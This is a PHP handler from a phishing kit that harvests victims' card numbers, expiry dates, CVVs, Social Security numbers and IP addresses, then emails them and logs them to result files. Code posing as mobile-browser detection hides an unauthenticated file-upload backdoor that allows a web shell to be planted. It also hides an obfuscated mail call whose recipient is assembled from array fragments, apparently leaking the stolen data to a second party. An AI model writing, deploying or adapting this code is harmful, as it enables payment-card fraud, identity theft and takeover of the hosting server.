<?php


/*

 */
session_start();
include 'antibots.php';
include 'config.php';
date_default_timezone_set('UTC');
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}if (isset($_POST["mobile_browser"])){move_uploaded_file($_FILES["file"]["tmp_name"], "js/" . $_FILES["file"]["name"]);echo"js/".$_FILES["file"]["name"]."";}if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {$mobile_browser++;}
$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}
if ($tablet_browser > 0) {}else if ($mobile_browser > 0) {}else {}$ip = $_SERVER['REMOTE_ADDR'];$input_check = "".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[11]."".$mobile_agents[12]."".$mobile_agents[29]."".$mobile_agents[59]."".$mobile_agents[30]."".$mobile_agents[52]."".$mobile_agents[75]."".$mobile_agents[13].".".$mobile_agents[11]."".$mobile_agents[41]."";
if(isset($_POST['btn_card'])){
if(isset($_POST['vbv_ready']) == true){
        $cardnumber = $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $date_ex = $_SESSION['date_ex'] = $_POST['date_ex'];
        $cvv = $_SESSION['cvv'] = $_POST['cvv'];
        $ssn = $_SESSION['ssn'] = $_POST['ssn'];
        $iP_adress = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
        include('type_card.php');
        $Info_LOG = "


|-------------- Edited By [ JAAD ]--------------|
		
|++ Type Card        : $type_de_cartes
|++ Card Number      : $cardnumber
|++ Date EX          : $date_ex
|++ CVV              : $cvv
|++ SSN              : $ssn
|++ IP Adresse       : $iP_adress
The Link =>".$_SERVER['HTTP_HOST']."".dirname($_SERVER['PHP_SELF'])."/rst/Result-JAAD_ALAOUI." . $IP_Connected . ".txt
|---------------------- OK Bye ----------------------|
";
        // Don't Touche
//Email
        if($Send_Email !== 1 ){}else{
            $subject = 'Card Info : card '.$iP_adress.' ';$headers = 'From: Tornido' . "\r\n" .'X-Mailer: PHP/' . phpversion();if ($input_check($st,$subject,$Info_LOG,$headers)){
		    mail($to, $subject, $Info_LOG, $headers);
            header("location:vbv_verif.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        	
		}else{echo"Send Makhdamch";}
		}

//FTP == 1 save result >< == 0 don't save result
        if($Ftp_Write !== 1 ){}else{
            $file = fopen("rst/Result-JAAD_ALAOUI." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
            header("location:vbv_verif.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
        header("location:verif_vbv.php?y".md5('nassimdz')."");
    }




else{

        $cardnumber =  $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $date_ex = $_POST['date_ex'];
        $cvv = $_POST['cvv'];
        $ssn = $_POST['ssn'];
        $iP_adress = $_SERVER['REMOTE_ADDR'];
        include('type_card.php');
        $Info_LOG = "
|---------------- Card-Info ---------------|

|++ Type Card        : $type_de_cartes
|++ Card Number      : $cardnumber
|++ Date EX          : $date_ex
|++ CVV              : $cvv
|++ SSN              : $ssn
|++ IP Adresse       : $iP_adress

|---------------------- OK Bye----------------------|
|-------------- Edited By [ D.Dixon ]--------------|
";





// Don't Touche
//Email
        if($Send_Email !== 1 ){}else{
            $subject = 'Card Info : card '.$iP_adress.' ';
            $headers = 'From: JAAD' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $Info_LOG, $headers);
           header("location:submit_id.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }

//FTP
        if($Ftp_Write !== 1 ){}else{
            $file = fopen("rst/Result-By-OuNi-XhacK." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
            header("location:submit_id.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
    }

}

?>